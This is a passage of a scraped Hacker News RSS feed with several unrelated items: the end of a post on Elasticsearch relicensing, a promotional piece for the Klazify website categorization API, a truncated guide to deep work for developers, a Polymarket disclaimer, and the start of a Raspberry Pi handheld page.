<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

<blockquote>
  <p>For more information on relicensing moves like this, please see <a href="https://anonymoushash.vmbrasseur.com/2019/06/07/the-problem-with-amazon-and-open-source-isnt-amazon/">The problem with Amazon and Open Source isn’t Amazon</a>.</p>
</blockquote>

<hr>

<blockquote>
  <p>Judging from the bandwidth usage stats on my hosting service, people seem to appreciate this post. Thank you for that. If you’d like me to provide corporate open source strategy for your company, please <a href="https://www.vmbrasseur.com/about/#contact">drop me an email</a>. I’ll soon be kicking my job search into high gear after <a href="https://anonymoushash.vmbrasseur.com/2020/06/01/farewell-juniper">Juniper laid off its open source team</a> last year. Contacting me now makes it more likely your company will be in consideration for my next role.</p>
</blockquote>

        
      </section>

      

      


      
  

    </div></div>]]>
            </description>
            <link>https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781695</guid>
            <pubDate>Thu, 14 Jan 2021 20:02:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Looking for a Free Website Categorization API?]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25781589">thread link</a>) | @alebrega
<br/>
January 14, 2021 | https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/ | <a href="https://web.archive.org/web/*/https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><strong>Website Categorization API</strong> classifies a site into a <strong>content</strong> <strong>category</strong>. It takes a <strong>URL</strong> as an input and assigns it into the relevant industry. There’s a lot of Categorizations API available on the internet but <a href="https://www.klazify.com/">Klazify</a> seems to be the most popular above all and should suit all your needs.</p>
<p><a href="https://www.klazify.com/">Klazify’s Website Categorization API</a> uses a machine learning (ML) engine to scan a website’s content and meta tags. It extracts text to classify the site and assigns up to three categories aided by natural language processing (NLP).</p>
<p>Their offline database is perfect for customers who require a local option for domain categorization. Typical use cases include hardware/product integrations, custom applications or internal use at an Enterprise organization with high request volume.</p>
<h2><strong>How Klazify works</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a> will navigate to the requested domain name or URL, collect its content,&nbsp; and determine appropriate categorizes based on a classification taxonomy: IAB V2 Standard, which can be used for 1-1 personalization, marketing segmentation, online filtering and more. The end result is that the URL or domain can now be placed in a specific category.</p>
<h2><strong>State Of The Art Accuracy</strong></h2>
<p>Their&nbsp; website categorization API is highly accurate, a simple lookup to a company’s URL will classify its industry within 385 possible topic categories.</p>
<h2><strong>Domain Processing</strong></h2>
<p><a href="https://www.klazify.com/">Klazify</a>’s domain processing begins one of two ways:</p>
<ul><li>New Domain Ingestion: Klazify examines the website, chasing new domains and re-indexing previously categorized domains.</li></ul>
<ul><li>External feeds: External data sources that are given to Klazify to process</li></ul>
<p><strong>Categorization</strong></p>
<p>Once a URL has been processed and passed the safety checks, it gets categorized.&nbsp;</p>
<h2><strong>Domain Categorization</strong></h2>
<p>There are over a lot of possible topic categories, making the list comprehensive but a little broader compared to other categorization taxonomies.&nbsp;</p>
<p><a href="https://www.klazify.com/category">Klazify’s categorization</a> is ideal for internet filtering and security applications, and best thing of all? They support all the domains available and almost all the languages of the world.</p>
<p>The Classification Taxonomy that Klazify uses is from the IAB, which was referenced before. IAB stands for “Interactive Advertising Bureau.” They’ve created a standard list of categories and subcategories for advertising purposes.</p>
<p>For example, if a publisher is putting together a campaign on Google Ads and only wants to show up on specific websites, Google utilizes the IAB classification to decide which category a certain domain belongs to. This means that if publishers are using Klazify to determine if websites URLs are relevant and pertinent for them to advertise on, the categorization that is given to them in Klazify is also used on advertising websites all over the internet.</p>
<h2><strong>Advertisers</strong></h2>
<p>For Advertisers, <a href="https://www.klazify.com/">Klazify</a> offers domain data categorized to the IAB taxonomy. Through Klazify’s API, customers can process large sets of data, allowing them to identify patterns between IPs and backlinking information or to categorize your data set. Advertisers often find this information useful in order to enhance customer demographics and better understand their behavior.</p>
<p>Once<a href="https://www.klazify.com/"> Klazify</a> finishes categorizing a domain, that domain can then have multiple categories associated with it. While a single website might only be placed in 3 categories using the IAB standards.</p>
<p>The IAB has nearly 385+ possible topic categories to choose from.&nbsp;</p>
<h2><strong>Network &amp; Cybersecurity</strong></h2>
<p>Network and Cybersecurity companies around the globe take advantage of <a href="https://www.klazify.com/">Klazify’s APIs </a>and data feeds to bring industry-leading threat intel and domain categorizations. Typical uses for Klazify include using their Domains API in order to dig deeper into network traffic or using their domain categorization API in order to categorize user access logs. Klazify incorporates over 66 data feeds to augment the engine.</p>
<h2><strong>Why Is <a href="https://www.klazify.com/">Klazify</a> The Best Option For Categorizing a Website?</strong></h2>
<h3><strong>Powerful &amp; Scalable</strong></h3>
<p>Klazify can scale to millions of requests and keep being stable under heavy workloads.</p>
<h3><strong>Easy-to-integrate</strong></h3>
<p>Customer’s time is valuable which is why Klazify’s APIs are simple to use and easy to integrate.</p>
<h3><strong>Dedicated Support Manager</strong></h3>
<p>Their Customer Support Team is always there to answer any questions.</p>
<h3><strong>Simple Documentation</strong></h3>
<p>Each endpoint is well documented with examples so a customer can quickly get started.</p>
<h2><strong>Key Features</strong></h2>
<h3><strong>Big Data</strong></h3>
<p>Using advanced machine learning, <a href="https://www.klazify.com/">Klazify</a> categorize billions of web pages, keeping the categorization database one of the most accurate in the industry.</p>
<h3><strong>Wide Range of Applications</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’</a>s domain categorization allows customers to easily provide services such as Internet filtering, subscriber analytics, advertising networks, and fraud prevention.</p>
<h3><strong>Data Firehose</strong></h3>
<p>Need access to the raw data stream of everything as it’s being categorized? <a href="https://www.klazify.com/">Klazify</a> provides a real-time data firehose via HTTP.</p>
<p><strong>Advanced Algorithms</strong></p>
<p><a href="https://www.klazify.com/">Klazify’s technology</a> categorizes content found on URLs, as well as entire websites and IP addresses, perfect for security devices that may not have access to the full URL.</p>
<h3><strong>Developer-Friendly Responses</strong></h3>
<p>Every API response is returned as JSON, which can be easily read and implemented into your product.</p>
<h3><strong>Always Up to Date</strong></h3>
<p><a href="https://www.klazify.com/">Klazify’s web</a> crawlers are constantly visiting and classifying new and existing websites, providing real-time results and keeping the database always up to date.</p>
<h2><strong>So what’s the difference between the other website categorization API and <a href="https://www.klazify.com/">Klazify</a>?</strong></h2>
<p>The difference between all the other tools and <a href="https://www.klazify.com/">Klazify</a> is that the latter is the closest thing to a real human being checking every nook and cranny of the domain you’re interested in. The bonus is, this tool can do this on hundreds of thousands of websites in a single second for less than $790.00/year.</p>
<p><a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=24380142150-e2kucj4jf9r4gs2tgej0p6bgjabetibn.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Fwww.klazify.com%2Flogin%2Fgoogle%2Fcallback&amp;scope=openid%20profile%20email&amp;response_type=code&amp;state=44cTTtCgjoFTqsZxXHOX75pYpadRc5DTzwS89tBk&amp;flowName=GeneralOAuthFlow">If you want to try Klazify, you can sign up clicking here</a></p>
<hr>
<p>
<em>
Also published on <a href="https://medium.com/@aleb/looking-for-a-free-website-categorization-api-check-this-company-61012f526396">Medium</a>. </em>
</p>

 </div></div>]]>
            </description>
            <link>https://www.thestartupfounder.com/looking-for-a-free-website-categorization-api-check-this-company/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781589</guid>
            <pubDate>Thu, 14 Jan 2021 19:56:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beginner Guide to Deep Work for Developers (2019)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781443">thread link</a>) | @scastiel
<br/>
January 14, 2021 | https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/ | <a href="https://web.archive.org/web/*/https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <header>
<picture><source srcset="https://d33wubrfki0l68.cloudfront.net/31427e8809882f2f88b3815be460e9e68c144550/45032/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/cad42f94f65dd50db9852aa3f2786421ed2d2a7e/65498/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/1bc10cef9e11b314f42b835dbe75f98f2ba357bf/2c1d1/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/c052d58c5dce0e6b100a153c7650b4ad6ca91fa6/eff9f/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/2414384395d4a3d4abb8a053991c4b58f8c270df/a9725/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/f6fef45366b42641c4463962ca17312d5d19c848/8a670/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/cc7b9207f88a124501d22bfe541db5c6d975a9bd/5402c/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/e4bc3e30b6697343f72727c043a8f3c341aeb3b3/ebb26/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/6503adb66349af68df4fbddc36c3c557b2d1ae38/38e41/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/6ba3f674392fb2973717686750254e91b940dff9/52315/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/cover.jpg" alt="Beginner Guide to Deep Work for Developers" height="900.0000000000001" width="1200" loading="lazy"></picture>

<p><small>17 Sep 2019 — 12 min read</small></p>
</header>
<p>Have you ever dreamed to wake up one morning and realize you felt different,
more powerful? As if you had this super power inside of you that it waiting to
be used. You'd meet someone very old and wise. He would tell you that you've
actually had this super power for a very long time. But you need to go through a
very difficult training phase to master it.</p>
<p>Good news: as a developer, you do have this super power. And although you will
need to practice, I promise you it sure won't be that difficult. This super
power is called <strong>Deep Work</strong>. It was made famous by the author and computer
science researcher <a href="http://www.calnewport.com/">Cal Newport</a> in his 2016
<a href="https://www.goodreads.com/book/show/25744928-deep-work">book of the same name</a>.
Here is one definition of Deep Work you can find
<a href="http://www.calnewport.com/books/deep-work/">in the book's abstract</a>:</p>
<blockquote>
<p>“Deep work is the ability to focus without distraction on a cognitively
demanding task. It’s a skill that allows you to quickly master complicated
information and produce better results in less time. Deep work will make you
better at what you do and provide the sense of true fulfillment that comes
from craftsmanship. In short, deep work is like a super power in our
increasingly competitive twenty-first century economy.”</p>
</blockquote>
<h2 id="why-do-i-need-deep-work%3F">Why do I need deep work?</h2>
<p>Deep work will improve your life as a developer in several ways. The first
obvious one is that you'll feel (and be) more productive. You'll deliver your
tasks quicker, with a better quality. And you'll feel more involved in your
projects. Without falling into the myth of the “10x-developer”, you will impress
your coworkers with the exceptional rate of your work.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/7e36d0bbd90043c53042c55daded7127cdcd8bb0/336da/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/bfd36863d8908dbd8960f79d73e0a39fa636c268/a52b6/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/42746c49d3231255b864abcfa1784d0f1f64fa8d/a7980/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/ff0a22b499c087cdd70a1dc97375170e8d8dadbd/282bb/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/addf4802d327abcb9ac93e487a4f3762b757a47d/32635/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/18d1c89070db0d877aef5a47c7811d926eb7db5e/1dcbd/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/25977e5d5f4b58892d9b0e4d0b9eebf787c1c053/28a0f/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/b05d6d2dc4d23a7a0aa5b84ca145b74de4c91312/e0a42/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/996703ef873cefc2a27a8a96afe01da510c43d65/0284b/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/69e2299f0352326a7083644662d36d33cffa6dfe/c8576/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/developer.jpg" alt="" height="675.0680951516252" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@emilep">Émile Perron</a>.</figcaption></figure>
<p>You'll also improve your level as a developer. Because you'll work faster,
you'll also progress a lot faster that before. Suppose you're a front-end
developer and use to work on UI stories (updating a form, creating a new
screen). It won't be long before you'll have so much experience that you want to
find ways to optimize everything. Testing new libraries to make things easier,
improve performance, and make a lot of refactoring. And all this will be a huge
plus for your career.</p>
<p>Last advantage of deep work that I can see, you'll separate better your personal
life from your professional one. You'll be better at stopping thinking about
work when you leave the office. And you'll even be better at enjoying your
leisure time on evenings and weekends.</p>
<blockquote>
<p>“The key to developing a deep work habit is to move beyond good intentions and
add routines and rituals to your working life.”</p>
</blockquote>
<p>The thing is, working deeply is not difficult in theory. You just have to...
well, work. The hardest part is actually what you do when you don't work deeply,
to help you when you do. Let's see what routine you can put in place to be able
to apply deep work in a classic day of work. I'll imagine you're a developer in
a company because it's my personal situation. Of course most principles will
apply if you're not.</p>
<h2 id="%F0%9F%95%96-arrive-at-the-office%2C-the-earlier-the-better">🕖 Arrive at the office, the earlier the better</h2>
<p>Everything starts as soon as you arrive at the office. If like most developers
you work in an open plan office, you can guess why it is not an optimal
condition for deep work. It's often noisy and distraction is all around
(conversations, phone calls...). Focus loss can also come from instant
messaging, emails, more or less useful meetings. But above all, a lot of context
switching. A colleague interrupts you for an innocent easy question. It takes
only a couple of minutes of your time. But the damage is done, you lost your
precious concentration.</p>
<p>One of the solutions I applied to counter this is pretty drastic: I started to
arrive at 7 a.m. every morning. As I explain in a previous post, by starting
working this early, I had a lot of time to work deeply, before any of my
colleagues arrives. For more than two hours, it's only me and my work: no
meetings, no noise, no context-switching. Imagine how it feels to have delivered
several tasks before your colleagues even have their first cup of coffee.</p>
<p>Of course it may not be that easy to arrive this early. If your employer doesn't
let you adjust your working hours as you want, or if you have kids, or if you're
definitely not a morning person, don't be afraid. There are still other tricks
to be able to work deeply.</p>
<p>One of the first thing I do when I arrive is trying to plan my day. First by
having a look at my agenda to see if I have important meetings (or less
important ones, that I can miss). But it's more important to define what your
day will look like. Not exactly which specific tasks you'll work on (we'll talk
about that further). But try to plan when in the day you have deep work
sessions, when you have a break with colleagues, or when you do shallow work
(i.e. non-deep work). Try not to be too much ambitious at first. Two hours in
the morning and two in the afternoon may be enough to begin. You'll already
produce a lot more than before.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/0b945a27a4cd33b15b4617bdae913bdd8bcb75fc/8ce21/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/2afaa458695a269e62c5b1495d49d5756248483e/f676b/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/ac0ee4aa9a79e7f1df8c724f66ddee9206f4a78c/f7612/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/28749638f7b2c868116faf537830ed34d6e6ca1d/7b0c7/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/d1926e06ec6c9c0af49a8993e245bcab587c2332/6e326/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/4e9cb7bf72f237781ea3b992c4a094fd7102664c/4ebe1/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/551daac36a5c918894e4c04dc2e61bbf7deee45c/e7d12/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/cea9e15ae2c9c096726d9502df9c1b3690b39294/1e300/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/356b4834675ee4f73b6faa2c7914b7b57ef06022/6b55c/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/47e7530ba39e3051f935d827d672b5a5ecca0068/bf045/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/coffee.jpg" alt="" height="800" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@sapegin">Artem Sapegin</a>.</figcaption></figure>
<p>Last step before starting your first deep work session of the day: have your
morning ritual. Cal Newport suggests that before starting a deep work session
you do a few actions you set for yourself. Like a routine to tell your brain
“prepare for a very intense work session”. For me this ritual consists first in
preparing a large cup of coffee. Then turning off all notifications (phone, IM,
e-mails). Making sure that only work-related windows and browser tabs are open.
And finally choosing an album or a playlist to listen. By the way, my
noise-cancelling earphones are my best friends. The day can begin.</p>

<h2 id="%F0%9F%95%A4-time-for-some-shallow-work">🕤 Time for some shallow work</h2>
<p>If you came to the office early, it must have been quiet until now, but here
comes a time when everyone else arrives. The office is now very noisy, everyone
talking about the series they watched last night. Good time to have a break, and
a cup of coffee with colleagues. Also a good opportunity to do this shallow work
you still need to do. Like answering some emails (or simply read some), planning
your next team's lunch, etc.</p>
<p>For me, this time usually includes the daily scrum at 10 a.m. After it, I also
check my Twitter and RSS feeds. It may be a good time for technology watch (and
you really need it in development). Be careful though to define first how much
time you want to dedicate to this (while planning your day for instance). Maybe
not more that 20 or 30 minutes. It's very easy to start and never finish going
from Twitter to Reddit to nowhere all day long. Even if it looks like just
checking development stuff.</p>
<p>After that, starts another session of deep work until it's lunch time. Or maybe
you need some help about a specific problem?</p>
<h2 id="%F0%9F%95%9A-i-need-help-from-a-colleague">🕚 I need help from a colleague</h2>
<p>Let's say you need to ask a coworker some help about a complex problem. (I'm not
talking about a simple question such as asking for access codes.) First, suppose
she might be in a deep work session herself, so ask her (by IM or email) when
would be a good time. Don't expect an answer in the minute, remember you
wouldn't like to be disturbed during a deep work session.</p>
<p>Open plan offices defenders will argue that they encourage the kind of
communication you need to solve these problems. Everyone is ready and available
to answer any question. More generally, open offices would be better for
creative ideas to emerge. Cal Newport refers to this idea as the theory of
serendipitous creativity.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/bace85d751b3e5d42ac8b95f384cffe6330540db/3c328/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/30d462e8bfc0749b96d1012a69445e47fb0c127f/d10c8/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/f0b4f840b22188ac9f37229c3b5b6354e91698e6/f7530/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/0b050963e00d8ccfb5d895ece26c05215da8867d/57634/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/e7c7e8870b77bbc24e43323a46d15baafa53ed34/95ed7/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/31a4b107e54b338c1593d3cd32e187739ed68127/2c2a4/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/430b195896a3b296ffc4217cb94d87757a640025/e36cb/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/4b25c76d33ea7bb1f6e907451448b1f2f892c5e0/a0c4d/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/c805f20a63655ad0379aa61e26b7b838cbd31ec1/1efae/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/83bb62d23d8b0bbb74790910c97e4b8ed4aae2b1/24ad5/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/white-board.jpg" alt="" height="800" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@youxventures">David Mao</a>.</figcaption></figure>
<p>Of course in a deep work philosophy this doesn't work. If you're always
available, it could mean you never have full focus on a task. So should you say
goodbye to communication and creativity? Of course not. A help session between
two developers can be deep work too. Cal Newport refers to this as the white
board effect. Define what problem you want to solve and what elements (answers)
you'll need to continue by yourself. Also make sure nobody will distract you
(find a meeting room for instance). Obviously the white board is not required,
but you understand the idea.</p>

<h2 id="%F0%9F%95%9B-lunch-break">🕛 Lunch break</h2>
<p>I wouldn't dare to tell you what to eat or how to enjoy your lunch. But there is
something interesting you can do after. This will improve your deep work
practice a lot. I'm talking about taking a walk (or a run, or bike session) and
meditate productively. The idea is to find a work problem and try to solve it
for instance. Or think about how to plan an upcoming meeting. Or prepare a
presentation. It's not quite easy to keep focus while walking or running,
especially if you can't take notes. But it's an excellent way to improve your
memory and ability to concentrate.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/9b7536d17fc6a7cfc2306f97638646b61f416af5/bdf36/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/8ffc83d516acfa08d13103bfbe45db1be99d1ace/5d2b0/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/5669e6dc7f636709bbd27a7b84e6881d3eb73d74/0a899/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/8013f88cd18a264bf8dcb1db7fe56251ebadd2be/20281/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/12211af9df3a6108ee628f6de37229017db35d6d/d167f/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/8f735268e60df2802c986cc494dd6f9364202ba5/0c33b/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/d0c99440a28a3b5e25d27741385e1dd26ce6d224/3752d/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/7f0ed3a66004759ec4d0531dfc7e1819fed0bc76/3e37a/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/022ea59260436591df3d6baccc6dd0579ae4633a/afd76/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/046ab38e3b348396722cd497ba5af85d25b3aea1/45c89/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/walk.jpg" alt="" height="802.1390374331551" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@punttim">Tim Gouw</a>.</figcaption></figure>
<p>Interesting fact about memory that Cal Newport raises. Some people are able to
remember a very complex things (a deck of cards, some number decimals...).
Studies evaluated their memory, and their conclusion are surprising. Their
ability to memorize things is not significantly better than anyone else's. But
their ability to concentrate is. In other words, the remembering part relies on
tricks more than memory. But these tricks need an ability to focus that must be
trained. Have a look at
<a href="https://www.artofmanliness.com/articles/how-to-memorize-a-deck-of-cards/">this method to memorize a deck of cards</a>.</p>
<h2 id="%F0%9F%95%92-after-the-scrum-planning">🕒 After the scrum planning</h2>
<p>Let’s imagine that afternoon started with a sprint planning. So you now know
what you’ll have to do for the next couple of weeks. Choose one of your tasks,
and take the time that you and your team estimated it would take. Now estimate
for yourself how much time you could use to do this task if you were perfectly
productive. This could divide by two or three the original estimate, but commit
to yourself (or better, to your team) about it.</p>
<p>For example if a task was estimated to four days and it’s Monday, commit to
finish it before Wednesday’s daily scrum. This can be rough, but having this
goal will imply you’ll know exactly what to work on for the next days’ deep work
sessions.</p>
<p>According to Cal Newport research, this method is inspired by the one that
Theodore Roosevelt himself used when he was a student. You’ll be surprised by
how it actually works most of the time. Of course there will still be …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/">https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/</a></em></p>]]>
            </description>
            <link>https://scastiel.dev/posts/2019-09-17-become-a-better-developer-by-mastering-deep-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781443</guid>
            <pubDate>Thu, 14 Jan 2021 19:47:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will an official Presidential inauguration take place?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25781074">thread link</a>) | @jjuuaann
<br/>
January 14, 2021 | https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021 | <a href="https://web.archive.org/web/*/https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>Disclaimer</h3><p>Polymarket is for informational and educational purposes only. We take no custody of anyone's money or cryptocurrency, extract no profits, nor do we host any markets ourselves. Polymarket displays existing markets live on the Ethereum blockchain (or sidechains) and is a graphical user interface for both visualizing data and market trends from on-chain activity, and interacting with said smart contracts directly via your Web 3 enabled wallet.</p></div></div></div>]]>
            </description>
            <link>https://polymarket.com/market/will-an-official-presidential-inauguration-take-place-in-person-outside-the-us-capitol-on-january-20th-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25781074</guid>
            <pubDate>Thu, 14 Jan 2021 19:27:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yarh.io Micro 2 Raspberry Pi 3B+ Hacker's Linux Handheld]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25780972">thread link</a>) | @enchiridion
<br/>
January 14, 2021 | https://yarh.io/yarh-io-m2.html | <a href="https://web.archive.org/web/*/https://yarh.io/yarh-io-m2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <section id="top-section">
        <div id="top-section-top">
            <nav>
                
            </nav>
            <p id="heading">
                
                <h2>Raspberry Pi 3B+ Hacker's Linux Handheld<br></h2>
            </p>
        </div>
    </section>
    <section id="yarh-io-mki">
        <div>
            <div>
                <div>
                    <p><a href="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" target="_blank" data-lightbox="yarh-io-mki"><img src="https://yarh.io/assets/img/yarh-m2-white-hand-large-t-001.png" alt="YARH.IO M2 Handheld"></a></p>
                    <div>
                        <p>Welcome to the new stage of the YARH.IO project, where our goal is to build a device designed for hacking, coding, and creative use. YARH.IO Micro 2 has been made with&nbsp;hackers in mind, for&nbsp;computer experts who uses their technical knowledge to achieve new goals and overcome computer system limitations by non-standard or 'hackable' means.&nbsp;<br></p>
                        <p>YARH.IO Micro 2 project continues to take on the challenge of building a full featured, micro sized handheld, based on Raspberry Pi 3B+, 4" touch screen and Bluetooth keyboard without touchpad.&nbsp;&nbsp;<br></p>
